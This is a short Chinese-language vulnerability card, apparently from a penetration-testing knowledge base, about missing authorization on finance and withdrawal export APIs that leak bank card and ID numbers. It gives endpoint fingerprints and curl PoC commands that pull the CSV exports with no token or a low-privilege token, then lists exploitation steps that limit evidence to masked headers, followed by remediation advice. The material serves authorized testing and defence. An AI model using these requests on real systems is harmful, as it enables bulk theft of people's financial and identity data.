---
title: 财务导出接口越权（银行卡 + 身份证批量导出）
cve: 无（业务逻辑）
severity: critical
cvss: 9.0
product: 自研财务/提现模块（资金面）
versions: 任意
ports: 80, 443
keywords: 财务, 导出, 银行卡, 身份证, 提现, 越权
entry: /api/finance/export  /api/withdraw/export
verified: false
sources: 公开资料整理（业务逻辑类，无 CVE）
---

## 指纹

```
GET /api/finance/export?startDate=..&endDate=..
GET /api/withdraw/export?status=approved
GET /api/admin/export/member
```

## 前置条件

- 普通会员或低权代理 token（有时完全无鉴权）。

## PoC

```bash
# 1) 未授权先试
curl -s 'https://target/api/finance/export?startDate=2026-01-01&endDate=2026-01-31' -o /tmp/e.csv -w '%{http_code} %{size_download}\n'
head -2 /tmp/e.csv
# 判定：200 + CSV 表头含 卡号/身份证 = 命中

# 2) 带普通 token 再试（很多站只在前端隐藏菜单）
curl -s 'https://target/api/withdraw/export?status=approved' -H "Authorization: Bearer <t>" -o /tmp/w.csv -w '%{http_code} %{size_download}\n'
head -2 /tmp/w.csv
```

## 利用步骤

1. 先无 token 试（最常见）；
2. 再带低权 token 试；两者都 403 才算安全；
3. 命中后**只取表头与前 3 行**证明字段（卡号/身份证/手机号），不要保存全量；
4. 证据：HTTP 头 + 表头 + 计数（总行数），内容打码。

## 修复与缓解

- 导出接口强制管理员角色 + 行级范围；异步任务 + 审计日志（谁导了多少行）。
- 敏感字段脱敏（卡号保留后四位），导出加水印。

## 参考

- OWASP API5 BFLA；个人信息保护合规要求（最小化导出）。
